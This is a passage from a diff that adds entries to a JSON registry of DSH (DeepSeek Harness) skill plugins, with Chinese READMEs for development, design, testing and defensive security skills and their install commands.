@@ -1,7 +1,403 @@
 {
-  "generatedAt": "2026-10-16T10:52:45.917Z",
+  "generatedAt": "2026-10-16T16:17:34.767Z",
   "count": 400,
   "plugins": [
+    {
+      "full_name": "satan9394/dsh-brand-design",
+      "html_url": "https://github.com/satan9394/dsh-brand-design",
+      "description": "DSH skill: 品牌设计系统（品牌资产协议 5 步、设计方向顾问三套逻辑并行、Junior Designer 工作流、反 AI slop、5 维度评审）（受 alchaincyf/huashu-design 23k★ 启发）",
+      "stars": 1,
+      "language": "JavaScript",
+      "pushed_at": "2026-08-19T23:52:44Z",
+      "topics": [
+        "dsh-plugin"
+      ],
+      "categories": [
+        "工具/开发"
+      ],
+      "tags": [
+        "dsh-plugin",
+        "agent"
+      ],
+      "readme_text": "# dsh-brand-design\n\nDSH（DeepSeek Harness）技能插件：**品牌设计系统**。\n\n打字回车拿到能交付的设计：品牌资产协议 5 步硬流程（问→搜官方品牌页→下载资产→grep 色值绝不从记忆猜→固化 brand-spec.md）、设计方向顾问（三套逻辑并行 subagent：秒数轮盘/现实参照获奖站/最佳设计师哲学，直接出 3 版真实视觉）、Junior Designer 工作流（先 assumptions+placeholders 尽早 show）、反 AI slop 规则、5 维度专家评审（雷达图 + Keep/Fix/Quick Wins）。受 [alchaincyf/huashu-design](https://github.com/alchaincyf/huashu-design)（23k★）启发的中文原创精简版。\n\n## 安装\n\n```bash\ndsh plugin add dsh-brand-design\n```\n\n## 触发方式\n\n描述中包含\"品牌设计 / 设计方向 / 交互原型 / 品牌色提取 / 设计评审 / 反 AI slop / 可编辑 PPTX\"等关键词时自动触发。\n\n## 能力\n\n- 品牌资产协议 5 步（色值 grep 提取，不猜）\n- 设计方向顾问（3 版真实视觉再选）\n- Junior Designer 工作流（早 show 早迭代）\n- 反 AI slop 规则\n- 5 维度专家评审（雷达图 + 行动清单）\n- 60 种 HTML 原生风格库\n\n## 许可\n\nMIT\n"
+    },
+    {
+      "full_name": "satan9394/dsh-api-scaffolding",
+      "html_url": "https://github.com/satan9394/dsh-api-scaffolding",
+      "description": "DSH skill: FastAPI 脚手架, 异步与分层结构（受 wshobson/agents 38k★ 启发）",
+      "stars": 1,
+      "language": "JavaScript",
+      "pushed_at": "2026-08-19T22:08:51Z",
+      "topics": [
+        "dsh-plugin"
+      ],
+      "categories": [
+        "Agent/智能体"
+      ],
+      "tags": [
+        "dsh-plugin",
+        "agent"
+      ],
+      "readme_text": "# dsh-api-scaffolding\n\nDSH（DeepSeek Harness）技能插件：**FastAPI 项目脚手架**。\n\n生产级项目结构（api/core/models/schemas/services 分层）、异步全链路、依赖注入、Pydantic 校验、认证与统一错误处理、pytest/Alembic/部署。受 [wshobson/agents](https://github.com/wshobson/agents)（38k★ MIT）启发的中文原创精简版。\n\n## 安装\n\n```bash\ndsh plugin add dsh-api-scaffolding\n```\n\n## 触发方式\n\n描述中包含\"FastAPI / Python 后端 / API 脚手架 / 异步 API / 建后端项目\"等关键词时自动触发。\n\n## 能力\n\n- 分层项目结构与路由薄接线\n- 异步全链路与 DI 依赖注入\n- Pydantic 校验与响应模型\n- 测试/迁移/部署完整纪律\n\n## 许可\n\nMIT\n"
+    },
+    {
+      "full_name": "satan9394/dsh-cicd",
+      "html_url": "https://github.com/satan9394/dsh-cicd",
+      "description": "DSH skill: CI/CD 自动化，质量门禁/shift-left/部署策略/调试 CI 失败（受 addyosmani/agent-skills 启发）",
+      "stars": 1,
+      "language": "JavaScript",
+      "pushed_at": "2026-08-19T18:52:33Z",
+      "topics": [
+        "dsh-plugin"
+      ],
+      "categories": [
+        "Agent/智能体"
+      ],
+      "tags": [
+        "dsh-plugin",
+        "agent"
+      ],
+      "readme_text": "# dsh-cicd\n\nCI/CD 自动化：质量门禁、shift-left、构建部署管线、发布策略、调试 CI 失败。\n\n受 [addyosmani/agent-skills](https://github.com/addyosmani/agent-skills)\n（88k★ MIT）的 ci-cd-and-automation 技能启发，改编为 DSH 中文原创精简版。\n\n## 安装\n\n```sh\ndsh plugin --profile web add dsh-cicd\n# 或本地开发：dsh plugin --profile web add link:E:\\DeepSeek_Harness\\workspace\\2026_08_15\\plugins\\dsh-cicd\n# 重启 dsh web 生效\n```\n\n## 使用\n\n对 agent 说\"配 CI / 加质量门禁 / 部署管线怎么搭\"，\n`cicd` 技能输出管线配置 + 门禁清单 + 部署策略。\n\n## 结构\n\n```\ndsh-cicd/\n├── index.js           # 注册 skills/ 到 ctx.skills\n├── cordis.patch.yml   # bundle patch 层\n├── package.json       # dsh.bundle manifest\n└── skills/cicd/SKILL.md\n```\n\n## License\n\nMIT。原创精简改编，灵感来自 addyosmani/agent-skills（MIT）。\n"
+    },
+    {
+      "full_name": "satan9394/dsh-database-design",
+      "html_url": "https://github.com/satan9394/dsh-database-design",
+      "description": "DSH skill: 数据库表设计，主键/规范化/索引/数据类型/约束/性能模式，PostgreSQL 重点（受 wshobson/agents 38k★ 启发）",
+      "stars": 1,
+      "language": "JavaScript",
+      "pushed_at": "2026-08-19T18:29:47Z",
+      "topics": [
+        "dsh-plugin"
+      ],
+      "categories": [
+        "Agent/智能体"
+      ],
+      "tags": [
+        "dsh-plugin",
+        "agent"
+      ],
+      "readme_text": "# dsh-database-design\n\n数据库表设计：主键/规范化/索引/数据类型/约束/性能模式，PostgreSQL 重点\n+ 通用规范。DSH 市场 database 类插件极少（约 2 个），空白明确。\n\n受 [wshobson/agents](https://github.com/wshobson/agents)（38k★ MIT，\n多 harness 插件技能库）的 database-design 插件启发，改编为 DSH\n中文原创精简版（含 PostgreSQL Gotchas 中文整理）。\n\n## 安装\n\n```sh\ndsh plugin --profile web add dsh-database-design\n# 或本地开发：dsh plugin --profile web add link:E:\\DeepSeek_Harness\\workspace\\2026_08_15\\plugins\\dsh-database-design\n# 重启 dsh web 生效\n```\n\n## 使用\n\n对 agent 说\"帮我设计表结构 / review 这个 schema\"，`database-design`\n技能按 澄清需求 → 出模型 → 对照规则自查 → 给 DDL 流程执行。\n\n## 结构\n\n```\ndsh-database-design/\n├── index.js           # 注册 skills/ 到 ctx.skills\n├── cordis.patch.yml   # bundle patch 层\n├── package.json       # dsh.bundle manifest\n└── skills/database-design/SKILL.md\n```\n\n## License\n\nMIT。原创精简改编，灵感来自 wshobson/agents（MIT）。\n"
+    },
+    {
+      "full_name": "satan9394/dsh-threat-modeling",
+      "html_url": "https://github.com/satan9394/dsh-threat-modeling",
+      "description": "DSH skill: 威胁建模, 攻击树与 STRIDE（受 wshobson/agents 38k★ 启发）",
+      "stars": 1,
+      "language": "JavaScript",
+      "pushed_at": "2026-08-19T21:42:41Z",
+      "topics": [
+        "dsh-plugin"
+      ],
+      "categories": [
+        "Agent/智能体"
+      ],
+      "tags": [
+        "dsh-plugin",
+        "agent"
+      ],
+      "readme_text": "# dsh-threat-modeling\n\nDSH（DeepSeek Harness）技能插件：**威胁建模**。\n\n攻击树构建（OR/AND/叶子节点 + 成本/时间/技能/检测属性）、STRIDE 六类威胁分类、缓解措施映射与优先级、安全需求提取。受 [wshobson/agents](https://github.com/wshobson/agents)（38k★ MIT）启发的中文原创精简版。\n\n## 安装\n\n```bash\ndsh plugin add dsh-threat-modeling\n```\n\n## 触发方式\n\n描述中包含\"威胁建模 / 攻击树 / STRIDE / 安全架构评审 / 攻击路径 / 缓解措施 / 防御优先级\"等关键词时自动触发。\n\n## 能力\n\n- 攻击树结构与节点类型\n- 攻击属性标注（成本/时间/技能/检测）\n- STRIDE 六类威胁分类\n- 缓解映射与残余风险管理\n\n## 许可\n\nMIT\n"
+    },
+    {
+      "full_name": "satan9394/dsh-code-simplify",
+      "html_url": "https://github.com/satan9394/dsh-code-simplify",
+      "description": "DSH skill: 代码简化，删冗余/降复杂度/去不必要抽象（受 addyosmani/agent-skills 启发）",
+      "stars": 1,
+      "language": "JavaScript",
+      "pushed_at": "2026-08-19T19:19:52Z",
+      "topics": [
+        "dsh-plugin"
+      ],
+      "categories": [
+        "Agent/智能体"
+      ],
+      "tags": [
+        "dsh-plugin",
+        "agent"
+      ],
+      "readme_text": "# dsh-code-simplify\n\n代码简化：删冗余、降复杂度、去不必要的抽象，让代码更简单可维护。\n简化 = 去掉复杂度，不是去掉功能；行为保持不变。\n\n受 [addyosmani/agent-skills](https://github.com/addyosmani/agent-skills)\n（88k★ MIT）的 code-simplification 技能启发，改编为 DSH 中文原创精简版。\n\n## 安装\n\n```sh\ndsh plugin --profile web add dsh-code-simplify\n# 或本地开发：dsh plugin --profile web add link:E:\\DeepSeek_Harness\\workspace\\2026_08_15\\plugins\\dsh-code-simplify\n# 重启 dsh web 生效\n```\n\n## 使用\n\n对 agent 说\"简化这段代码 / 太绕了精简一下\"，\n`code-simplify` 技能按 理解 → 列简化点 → 小步简化 → 验证 → 交付 diff 执行。\n\n## 结构\n\n```\ndsh-code-simplify/\n├── index.js           # 注册 skills/ 到 ctx.skills\n├── cordis.patch.yml   # bundle patch 层\n├── package.json       # dsh.bundle manifest\n└── skills/code-simplify/SKILL.md\n```\n\n## License\n\nMIT。原创精简改编，灵感来自 addyosmani/agent-skills（MIT）。\n"
+    },
+    {
+      "full_name": "satan9394/dsh-designmd",
+      "html_url": "https://github.com/satan9394/dsh-designmd",
+      "description": "DSH skill: DESIGN.md 设计系统格式（YAML tokens + Markdown rationale、token 引用、lint/diff/export 工具链、WCAG AA 对比度）（受 google-labs-code/design.md 27k★ 启发）",
+      "stars": 1,
+      "language": "JavaScript",
+      "pushed_at": "2026-08-19T23:41:32Z",
+      "topics": [
+        "dsh-plugin"
+      ],
+      "categories": [
+        "工具/开发"
+      ],
+      "tags": [
+        "dsh-plugin",
+        "agent"
+      ],
+      "readme_text": "# dsh-designmd\n\nDSH（DeepSeek Harness）技能插件：**DESIGN.md 设计系统格式**。\n\n给 coding agent 的视觉身份规范：YAML 设计 token（颜色/字体/圆角/间距/组件）+ Markdown 设计理由、token 引用 `{colors.primary}`、lint/diff/export 工具链（Tailwind v3/v4、W3C DTCG）、WCAG AA 对比度检查、section 顺序与未知内容处理规则。受 [google-labs-code/design.md](https://github.com/google-labs-code/design.md)（27k★）启发的中文原创精简版。\n\n## 安装\n\n```bash\ndsh plugin add dsh-designmd\n```\n\n## 触发方式\n\n描述中包含\"设计系统 / 设计 token / 视觉身份 / DESIGN.md / 统一 UI 风格 / 设计规范文件\"等关键词时自动触发。\n\n## 能力\n\n- YAML tokens + Markdown rationale 双层结构\n- token 引用与组件变体（hover/active/pressed）\n- lint：broken-ref / contrast-ratio（WCAG AA）/ section-order 等 11 规则\n- diff：token 级与 prose 级回归检测\n- export：json-tailwind / css-tailwind / dtcg\n- 未知内容容错规则\n\n## 许可\n\nMIT\n"
+    },
+    {
+      "full_name": "satan9394/dsh-frontend-engineering",
+      "html_url": "https://github.com/satan9394/dsh-frontend-engineering",
+      "description": "DSH skill: 前端 UI 工程，组件/状态管理/数据获取/性能与可维护性（受 addyosmani/agent-skills 启发）",
+      "stars": 1,
+      "language": "JavaScript",
+      "pushed_at": "2026-08-19T19:31:15Z",
+      "topics": [
+        "dsh-plugin"
+      ],
+      "categories": [
+        "Agent/智能体"
+      ],
+      "tags": [
+        "dsh-plugin",
+        "agent"
+      ],
+      "readme_text": "# dsh-frontend-engineering\n\n前端 UI 工程：组件设计、状态管理、数据获取、性能与可维护性，把前端当工程做。\n与 dsh-frontend-design 互补（设计好看 vs 实现正确）。\n\n受 [addyosmani/agent-skills](https://github.com/addyosmani/agent-skills)\n（88k★ MIT）的 frontend-ui-engineering 技能启发，改编为 DSH\n中文原创精简版。\n\n## 安装\n\n```sh\ndsh plugin --profile web add dsh-frontend-engineering\n# 或本地开发：dsh plugin --profile web add link:E:\\DeepSeek_Harness\\workspace\\2026_08_15\\plugins\\dsh-frontend-engineering\n# 重启 dsh web 生效\n```\n\n## 使用\n\n对 agent 说\"搭前端工程 / 组件怎么设计 / 状态管理怎么选\"，\n`frontend-engineering` 技能按组件→状态→数据→性能→结构 输出工程方案。\n\n## 结构\n\n```\ndsh-frontend-engineering/\n├── index.js           # 注册 skills/ 到 ctx.skills\n├── cordis.patch.yml   # bundle patch 层\n├── package.json       # dsh.bundle manifest\n└── skills/frontend-engineering/SKILL.md\n```\n\n## License\n\nMIT。原创精简改编，灵感来自 addyosmani/agent-skills（MIT）。\n"
+    },
+    {
+      "full_name": "satan9394/dsh-bash-testing",
+      "html_url": "https://github.com/satan9394/dsh-bash-testing",
+      "description": "DSH skill: Shell 脚本测试, BATS 单元测试（受 wshobson/agents 38k★ 启发）",
+      "stars": 1,
+      "language": "JavaScript",
+      "pushed_at": "2026-08-19T21:35:27Z",
+      "topics": [
+        "dsh-plugin"
+      ],
+      "categories": [
+        "Agent/智能体"
+      ],
+      "tags": [
+        "dsh-plugin",
+        "agent"
+      ],
+      "readme_text": "# dsh-bash-testing\n\nDSH（DeepSeek Harness）技能插件：**Shell 脚本测试**。\n\nBATS（Bash Automated Testing System）单元测试：错误条件与边界测试（含消息断言）、fixture 与依赖 stub、CI 集成、多 shell 方言验证。受 [wshobson/agents](https://github.com/wshobson/agents)（38k★ MIT）启发的中文原创精简版。\n\n## 安装\n\n```bash\ndsh plugin add dsh-bash-testing\n```\n\n## 触发方式\n\n描述中包含\"BATS / shell 测试 / 脚本单元测试 / 脚本 TDD / bash 测试 / 脚本 CI\"等关键词时自动触发。\n\n## 能力\n\n- BATS run/$status/$output 断言模式\n- 错误条件测试（缺文件/非法输入/权限拒绝）\n- fixture 与依赖 stub、环境隔离\n- CI 接入与多方言验证\n\n## 许可\n\nMIT\n"
+    },
+    {
+      "full_name": "satan9394/dsh-e2e-testing",
+      "html_url": "https://github.com/satan9394/dsh-e2e-testing",
+      "description": "DSH skill: 端到端测试, Playwright/Cypress（受 wshobson/agents 38k★ 启发）",
+      "stars": 1,
+      "language": "JavaScript",
+      "pushed_at": "2026-08-19T21:14:06Z",
+      "topics": [
+        "dsh-plugin"
+      ],
+      "categories": [
+        "Agent/智能体"
+      ],
+      "tags": [
+        "dsh-plugin",
+        "agent"
+      ],
+      "readme_text": "# dsh-e2e-testing\n\nDSH（DeepSeek Harness）技能插件：**端到端测试**。\n\nPlaywright/Cypress E2E：测什么/不测什么（测试金字塔）、关键用户旅程、防 flaky 策略（data-testid/自动等待/数据隔离/网络可控）、CI 分片并行、失败 trace 证据、a11y 与响应式验证。受 [wshobson/agents](https://github.com/wshobson/agents)（38k★ MIT）启发的中文原创精简版。\n\n## 安装\n\n```bash\ndsh plugin add dsh-e2e-testing\n```\n\n## 触发方式\n\n描述中包含\"E2E 测试 / 端到端 / Playwright / Cypress / flaky / 测试金字塔 / 关键旅程\"等关键词时自动触发。\n\n## 能力\n\n- E2E 边界（测关键旅程，不测单测范围）\n- Playwright vs Cypress 选型\n- 防 flaky 六式\n- CI 分片与失败证据（trace/视频）\n\n## 许可\n\nMIT\n"
+    },
+    {
+      "full_name": "satan9394/dsh-merge-conflicts",
+      "html_url": "https://github.com/satan9394/dsh-merge-conflicts",
+      "description": "DSH skill: 解决 git 合并/变基冲突五步流程（受 mattpocock/skills 启发）",
+      "stars": 1,
+      "language": "JavaScript",
+      "pushed_at": "2026-08-19T17:39:51Z",
+      "topics": [
+        "dsh-plugin"
+      ],
+      "categories": [
+        "工具/开发"
+      ],
+      "tags": [
+        "dsh-plugin",
+        "agent"
+      ],
+      "readme_text": "# dsh-merge-conflicts\n\n解决 git 合并/变基冲突：看清现状 → 找到各方意图 → 逐块解决 →\n跑自动化检查 → 完成合并。\n\n受 [mattpocock/skills](https://github.com/mattpocock/skills)\n（223k★ MIT）启发，改编为 DSH 中文原创精简版。\n\n## 安装\n\n```sh\ndsh plugin --profile web add dsh-merge-conflicts\n# 或本地开发：dsh plugin --profile web add link:E:\\DeepSeek_Harness\\workspace\\2026_08_15\\plugins\\dsh-merge-conflicts\n# 重启 dsh web 生效\n```\n\n## 使用\n\n对 agent 说\"帮我解决这个合并冲突 / rebase 冲突了\"，提供 git 状态，\n`merge-conflicts` 技能按五步流程稳定解决。\n\n## 结构\n\n```\ndsh-merge-conflicts/\n├── index.js           # 注册 skills/ 到 ctx.skills\n├── cordis.patch.yml   # bundle patch 层\n├── package.json       # dsh.bundle manifest\n└── skills/merge-conflicts/SKILL.md\n```\n\n## License\n\nMIT。原创精简改编，灵感来自 mattpocock/skills（MIT）。\n"
+    },
+    {
+      "full_name": "satan9394/dsh-setup-wizard",
+      "html_url": "https://github.com/satan9394/dsh-setup-wizard",
+      "description": "DSH skill: 交互式设置向导, 人工步骤逐步引导（受 mattpocock/skills 223k★ 启发）",
+      "stars": 1,
+      "language": "JavaScript",
+      "pushed_at": "2026-08-19T22:26:57Z",
+      "topics": [
+        "dsh-plugin"
+      ],
+      "categories": [
+        "工具/开发"
+      ],
+      "tags": [
+        "dsh-plugin"
+      ],
+      "readme_text": "# dsh-setup-wizard\n\nDSH（DeepSeek Harness）技能插件：**交互式设置向导**。\n\n为只能人工完成的步骤生成 bash 向导：逐步打开 URL、指示点击复制、捕获值写入 .env/GitHub secrets、每阶段确认、显示剩余步数；用于基础设施开通、凭据/CI 密钥、陌生第三方后台、一次性迁移。受 [mattpocock/skills](https://github.com/mattpocock/skills) 的 wizard（223k★ MIT）启发的中文原创精简版。\n\n## 安装\n\n```bash\ndsh plugin add dsh-setup-wizard\n```\n\n## 触发方式\n\n描述中包含\"设置向导 / 配置凭据 / CI 密钥 / 开通基础设施 / 后台操作 / 一次性迁移\"等关键词时自动触发。\n\n## 能力\n\n- 流程划定（读仓库找人工步骤与值）\n- 阶段路径映射（可照做、不编造）\n- 向导编写纪律（先开 URL/密钥隐藏/confirm）\n- 验证交接与一次性默认\n\n## 许可\n\nMIT\n"
+    },
+    {
+      "full_name": "satan9394/dsh-sast-security",
+      "html_url": "https://github.com/satan9394/dsh-sast-security",
+      "description": "DSH skill: SAST 工具配置, Semgrep/SonarQube/CodeQL（受 wshobson/agents 38k★ 启发）",
+      "stars": 1,
+      "language": "JavaScript",
+      "pushed_at": "2026-08-19T23:07:32Z",
+      "topics": [
+        "dsh-plugin"
+      ],
+      "categories": [
+        "Agent/智能体"
+      ],
+      "tags": [
+        "dsh-plugin",
+        "agent"
+      ],
+      "readme_text": "# dsh-sast-security\n\nDSH（DeepSeek Harness）技能插件：**SAST 工具配置**。\n\n静态应用安全测试（Semgrep/SonarQube/CodeQL）：自定义规则、CI/CD 集成、质量门与合规策略、误报调优与扫描性能、多工具纵深防御。受 [wshobson/agents](https://github.com/wshobson/agents)（38k★ MIT）启发的中文原创精简版。\n\n## 安装\n\n```bash\ndsh plugin add dsh-sast-security\n```\n\n## 触发方式\n\n描述中包含\"SAST / 静态安全测试 / Semgrep / SonarQube / CodeQL / 安全扫描配置 / 漏洞检测\"等关键词时自动触发。\n\n## 能力\n\n- 三工具配置要点（Semgrep/SonarQube/CodeQL）\n- 自定义规则与误报调优\n- 质量门与 CI 集成\n- 与 DAST/依赖扫描互补\n\n## 许可\n\nMIT\n"
+    },
+    {
+      "full_name": "satan9394/dsh-source-driven",
+      "html_url": "https://github.com/satan9394/dsh-source-driven",
+      "description": "DSH skill: 源码驱动开发，框架决策官方文档背书/引用来源（受 addyosmani/agent-skills 88k★ 启发）",
+      "stars": 1,
+      "language": "JavaScript",
+      "pushed_at": "2026-08-19T19:19:43Z",
+      "topics": [
+        "dsh-plugin"
+      ],
+      "categories": [
+        "Agent/智能体"
+      ],
+      "tags": [
+        "dsh-plugin",
+        "agent"
+      ],
+      "readme_text": "# dsh-source-driven\n\n源码驱动开发：每个框架/库代码决策都用官方文档背书，不凭记忆实现，\n验证并引用来源（注释标注 + 来源清单交付）。\n\n受 [addyosmani/agent-skills](https://github.com/addyosmani/agent-skills)\n（88k★ MIT）的 source-driven-development 技能启发，改编为 DSH\n中文原创精简版。\n\n## 安装\n\n```sh\ndsh plugin --profile web add dsh-source-driven\n# 或本地开发：dsh plugin --profile web add link:E:\\DeepSeek_Harness\\workspace\\2026_08_15\\plugins\\dsh-source-driven\n# 重启 dsh web 生效\n```\n\n## 使用\n\n对 agent 说\"按官方文档实现 / 要验证过的写法\"，\n`source-driven` 技能查官方文档、引用来源、交付来源清单。\n\n## 结构\n\n```\ndsh-source-driven/\n├── index.js           # 注册 skills/ 到 ctx.skills\n├── cordis.patch.yml   # bundle patch 层\n├── package.json       # dsh.bundle manifest\n└── skills/source-driven/SKILL.md\n```\n\n## License\n\nMIT。原创精简改编，灵感来自 addyosmani/agent-skills（MIT）。\n"
+    },
+    {
+      "full_name": "satan9394/dsh-writing-fragments",
+      "html_url": "https://github.com/satan9394/dsh-writing-fragments",
+      "description": "DSH skill: 写作探索, 碎片挖掘与领航词（受 mattpocock/skills 223k★ 启发）",
+      "stars": 1,
+      "language": "JavaScript",
+      "pushed_at": "2026-08-19T22:35:19Z",
+      "topics": [
+        "dsh-plugin"
+      ],
+      "categories": [
+        "工具/开发"
+      ],
+      "tags": [
+        "dsh-plugin"
+      ],
+      "readme_text": "# dsh-writing-fragments\n\nDSH（DeepSeek Harness）技能插件：**写作探索（碎片挖掘）**。\n\n纯探索阶段的写作伴生技能：盘问用户、从第一句话捕获碎片、碎片异构（金句/主张/小场景/半想法/引语）、领航词是最有价值的碎片、单一文件追加不承诺结构。受 [mattpocock/skills](https://github.com/mattpocock/skills) 的 writing-fragments（223k★ MIT）启发的中文原创精简版。\n\n## 安装\n\n```bash\ndsh plugin add dsh-writing-fragments\n```\n\n## 触发方式\n\n描述中包含\"写作探索 / 收集素材 / 碎片 / 领航词 / 还没结构 / 想写点什么\"等关键词时自动触发。\n\n## 能力\n\n- 碎片定义与异构形态\n- 领航词挖掘（承重墙）\n- 从第一句捕获 + 单一文件\n- 与塑形/节拍的探索-开采分工\n\n## 许可\n\nMIT\n"
+    },
+    {
+      "full_name": "satan9394/dsh-humanizer-zh",
+      "html_url": "https://github.com/satan9394/dsh-humanizer-zh",
+      "description": "DSH skill: 中文去 AI 痕迹，改写 AI 腔让文字更像人写的（受 Humanizer-zh 15.6k★ 启发）",
+      "stars": 1,
+      "language": "JavaScript",
+      "pushed_at": "2026-08-19T17:27:05Z",
+      "topics": [
+        "dsh-plugin"
+      ],
+      "categories": [
+        "工具/开发"
+      ],
+      "tags": [
+        "dsh-plugin",
+        "agent"
+      ],
+      "readme_text": "# dsh-humanizer-zh\n\n中文去 AI 痕迹：识别并改写 AI 生成的腔调（空洞强调、模板句、过度书面化、\n机械结构），让文字更像真人书写。\n\n受 [op7418/Humanizer-zh](https://github.com/op7418/Humanizer-zh)\n（15.6k★ MIT，Humanizer 汉化版）启发，改编为 DSH 中文原创精简技能：\n保留 5 条核心原则与高频模式清单，控制篇幅，聚焦可直接执行的改写流程。\n\n## 安装\n\n```sh\ndsh plugin --profile web add dsh-humanizer-zh\n# 或本地开发：dsh plugin --profile web add link:E:\\DeepSeek_Harness\\workspace\\2026_08_15\\plugins\\dsh-humanizer-zh\n# 重启 dsh web 生效\n```\n\n## 使用\n\n对 agent 说\"这段文字去 AI 痕迹\"或\"改写得更有人味\"，粘贴文本，\n`humanizer-zh` 技能会输出改写全文 + 改动说明。\n\n## 结构\n\n```\ndsh-humanizer-zh/\n├── index.js           # 注册 skills/ 到 ctx.skills\n├── cordis.patch.yml   # bundle patch 层\n├── package.json       # dsh.bundle manifest\n└── skills/humanizer-zh/SKILL.md\n```\n\n## License\n\nMIT。技能内容为原创精简改编，灵感来自 op7418/Humanizer-zh（MIT）。\n"
+    },
+    {
+      "full_name": "satan9394/dsh-codebase-scanner",
+      "html_url": "https://github.com/satan9394/dsh-codebase-scanner",
+      "description": "DSH skill: 代码库扫描, 项目文档与漂移检测（受 wshobson/agents ship-mate 启发）",
+      "stars": 1,
+      "language": "JavaScript",
+      "pushed_at": "2026-08-19T21:20:48Z",
+      "topics": [
+        "dsh-plugin"
+      ],
+      "categories": [
+        "Agent/智能体"
+      ],
+      "tags": [
+        "dsh-plugin",
+        "agent"
+      ],
+      "readme_text": "# dsh-codebase-scanner\n\nDSH（DeepSeek Harness）技能插件：**代码库扫描**。\n\n扫描项目生成 project-doc.md（Tech Stack/依赖/架构/目录/代码风格/数据架构/横切关注点）与 AGENTS.md，首次全量 + 增量 delta 扫描检测漂移，供下游 agent 使用的准确项目文档。受 [wshobson/agents](https://github.com/wshobson/agents) 的 ship-mate scan（38k★ MIT）启发的中文原创精简版。\n\n## 安装\n\n```bash\ndsh plugin add dsh-codebase-scanner\n```\n\n## 触发方式\n\n描述中包含\"扫描代码库 / 生成项目文档 / AGENTS.md / 架构变更 / 文档漂移 / 新仓库引导\"等关键词时自动触发。\n\n## 能力\n\n- 全量/增量扫描模式判定\n- 项目文档九章节结构\n- 上下文保护（大输出沙箱化）\n- 漂移检测与 AGENTS.md 人工确认\n\n## 许可\n\nMIT\n"
+    },
+    {
+      "full_name": "satan9394/dsh-event-driven-architecture",
+      "html_url": "https://github.com/satan9394/dsh-event-driven-architecture",
+      "description": "DSH skill: 事件驱动架构, CQRS/事件溯源/Saga（受 wshobson/agents 38k★ 启发）",
+      "stars": 1,
+      "language": "JavaScript",
+      "pushed_at": "2026-08-19T20:50:33Z",
+      "topics": [
+        "dsh-plugin"
+      ],
+      "categories": [
+        "Agent/智能体"
+      ],
+      "tags": [
+        "dsh-plugin",
+        "agent"
+      ],
+      "readme_text": "# dsh-event-driven-architecture\n\nDSH（DeepSeek Harness）技能插件：**事件驱动架构**。\n\nCQRS 读写分离、事件溯源（Event Sourcing）与事件存储设计、投影（Projection）读模型、Saga 分布式事务与补偿编排。受 [wshobson/agents](https://github.com/wshobson/agents)（38k★ MIT）启发的中文原创精简版。\n\n## 安装\n\n```bash\ndsh plugin add dsh-event-driven-architecture\n```\n\n## 触发方式\n\n描述中包含\"事件驱动 / CQRS / 事件溯源 / Event Sourcing / Saga / 分布式事务 / 事件存储 / 投影\"等关键词时自动触发。\n\n## 能力\n\n- CQRS 命令/查询模型分离与最佳实践\n- 事件存储设计（append-only/版本化/幂等）与技术选型\n- 投影读模型与可重放\n- Saga 编排/编排舞、补偿路径测试与卡死排查\n\n## 许可\n\nMIT\n"
+    },
+    {
+      "full_name": "satan9394/dsh-db-migration",
+      "html_url": "https://github.com/satan9394/dsh-db-migration",
+      "description": "DSH skill: 数据库迁移，up/down/expand-contract/不宕机变更/一致性校验（受 wshobson/agents 启发）",
+      "stars": 1,
+      "language": "JavaScript",
+      "pushed_at": "2026-08-19T20:22:15Z",
+      "topics": [
+        "dsh-plugin"
+      ],
+      "categories": [
+        "Agent/智能体"
+      ],
+      "tags": [
+        "dsh-plugin",
+        "agent"
+      ],
+      "readme_text": "# dsh-db-migration\n\n数据库迁移：迁移流程、up/down 成对脚本、不宕机变更模式\n（expand-contract）、数据一致性校验、回滚。\n\n受 [wshobson/agents](https://github.com/wshobson/agents)（38k★ MIT）\n的 framework-migration/database-migration 技能启发，改编为 DSH\n中文原创精简版（与 dsh-database-design / dsh-deprecation 互补）。\n\n## 安装\n\n```sh\ndsh plugin --profile web add dsh-db-migration\n# 或本地开发：dsh plugin --profile web add link:E:\\DeepSeek_Harness\\workspace\\2026_08_15\\plugins\\dsh-db-migration\n# 重启 dsh web 生效\n```\n\n## 使用\n\n对 agent 说\"改表结构 / 数据迁移\"，`db-migration` 技能输出\n迁移方案（up/down + 不宕机模式 + 校验与回滚）。\n\n## 结构\n\n```\ndsh-db-migration/\n├── index.js           # 注册 skills/ 到 ctx.skills\n├── cordis.patch.yml   # bundle patch 层\n├── package.json       # dsh.bundle manifest\n└── skills/db-migration/SKILL.md\n```\n\n## License\n\nMIT。原创精简改编，灵感来自 wshobson/agents（MIT）。\n"
+    },
+    {
+      "full_name": "satan9394/dsh-frontend-slides",
+      "html_url": "https://github.com/satan9394/dsh-frontend-slides",
+      "description": "DSH skill: 零依赖 HTML 演示文稿（show-don't-tell 视觉风格发现、PPT 转网页、anti-AI-slop 风格、34 bold 模板渐进加载）（受 zarazhangrui/frontend-slides 27k★ 启发）",
+      "stars": 1,
+      "language": "JavaScript",
+      "pushed_at": "2026-08-19T23:48:56Z",
+      "topics": [
+        "dsh-plugin"
+      ],
+      "categories": [
+        "内容/媒体"
+      ],
+      "tags": [
+        "dsh-plugin"
+      ],
+      "readme_text": "# dsh-frontend-slides\n\nDSH（DeepSeek Harness）技能插件：**零依赖 HTML 演示文稿**。\n\n帮非设计师做出好看的网页演示：show-don't-tell 视觉风格发现（生成 3 个预览让用户选，而非文字描述审美）、PPT 转网页（保留全部图片内容）、anti-AI-slop 精选风格（拒绝紫渐变白底通用 AI 审美）、34 个 bold 设计系统渐进加载（先索引 → 候选预览 → 选中才加载完整设计）。受 [zarazhangrui/frontend-slides](https://github.com/zarazhangrui/frontend-slides)（27k★）启发的中文原创精简版。\n\n## 安装\n\n```bash\ndsh plugin add dsh-frontend-slides\n```\n\n## 触发方式\n\n描述中包含\"做演示文稿 / 网页幻灯片 / HTML slides / PPT 转网页 / pitch deck / 技术分享 slides\"等关键词时自动触发。\n\n## 能力\n\n- 视觉风格发现（3 预览供选）\n- PPT 转换（素材全保留）\n- 12 内置预设 + 34 bold 设计系统\n- 渐进加载（控制上下文成本）\n- anti-AI-slop 风格把关\n- 单 HTML 零依赖、16:9、可访问\n\n## 许可\n\nMIT\n"
+    },
+    {
+      "full_name": "satan9394/dsh-error-handling",
+      "html_url": "https://github.com/satan9394/dsh-error-handling",
+      "description": "DSH skill: 错误处理模式，分层/类型化/优雅降级/可观测/恢复（受 wshobson/agents 启发）",
+      "stars": 1,
+      "language": "JavaScript",
+      "pushed_at": "2026-08-19T20:28:28Z",
+      "topics": [
+        "dsh-plugin"
+      ],
+      "categories": [
+        "Agent/智能体"
+      ],
+      "tags": [
+        "dsh-plugin",
+        "agent"
+      ],
